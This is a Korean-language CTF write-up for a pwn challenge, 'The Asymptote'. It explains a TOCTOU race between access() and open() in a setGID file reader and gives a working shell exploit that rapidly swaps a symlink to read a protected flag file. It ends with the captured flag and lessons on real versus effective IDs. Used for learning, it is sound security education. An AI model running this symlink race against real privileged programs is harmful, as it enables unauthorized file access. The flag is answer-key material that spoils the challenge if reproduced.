---
ctf_name: "Incognito 7.0"
challenge_name: "The Asymptote"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "Sn0wyDay"
date: "2026-04-14"
points: 150
tags: [TOCTOU, race-condition]
---

# 문제명
The Asymptote

## 문제 설명

> A mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on similar absolute logic. It is demonstrably secure.

- https://incognito.axiosiiitl.dev/challenges#The%20Asymptote-16
`nc 34.131.216.230 1338`

## 풀이

### 분석

접속하면 세션 디렉토리에 challenge, flag.txt, welcome.txt 3개 파일이 존재한다.
당연 cat flag.txt를 먼저 해봤는데, 권한이 없어서 볼 수 없었고, welcome.txt는 볼 수 있었다.
ls -l로 확인해본 결과 challenge에 setGID비트가 설정되어 있어서 flag_group 권한으로 동작한다.
flag.txt는 이 그룹만 읽을 수 있다. 하지만 challenge를 실행하면 welcome.txt를 읽어서 출력한다.
welcome.txt를 지우고 ln -s flag.txt welcome.txt 를 설정한 뒤, challenge를 실행했다.

Security Alert: You don't have permission to read welcome.txt
다음과 같은 에러 메세지가 떴다. -> TOCTOU가 가능하다.

### 취약점

TOCTOU 취약점 Time Of Check To Time Of Use
challenge 내부 동작에서
1. 파일 확인 access("welcome.txt")
2. 파일 사용 open("welcome.txt")
이렇게 2단계로 나눌 수 있는데, 이 두 단계가 별개의 순간이다. 이 찰나의 순간에 파일을 바꿔도 같다는 보장을 할 수 없다.
따라서 그 순간에 파일을 바꾸는 것이다.

### 익스플로잇

풀이 과정을 단계별로 작성합니다.

```
echo "decoy" > decoy.txt

while true; do
  ln -sf decoy.txt welcome.txt
  ln -sf flag.txt welcome.txt
done &

while true; do
  ./challenge 2>/dev/null | grep -v Security | grep -v Welcome | grep -v reading | grep -v "^$"
done

```

## 플래그

```
IIITL{4cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d_ab45257374ba}
```

## 배운 점

access()와 open()의 차이에 대해서 알게 되었다.
access()는 권한 기준이 실제 유저/그룹이어서 setGID를 무시하고,
open()은 권한 기준이 유효 유저/그룹이어서 setGID를 적용한다.

TOCTOU(Time Of Check To Time Of Use) 기법
확인과 사용 사이의 틈을 노리는 공격이다
1번에서 확인한 파일과 2번에서 사용하는 파일이 같다는 보장이 없다는 점을 이용한다
심볼릭 링크를 빠르게 교체하면서 체크는 통과하고 다른 파일을 읽게 되는 순간을 노린다.

Race Condition 익스플로잇 패턴
루프를 두 개를 돌려서 타이밍을 맞춘다.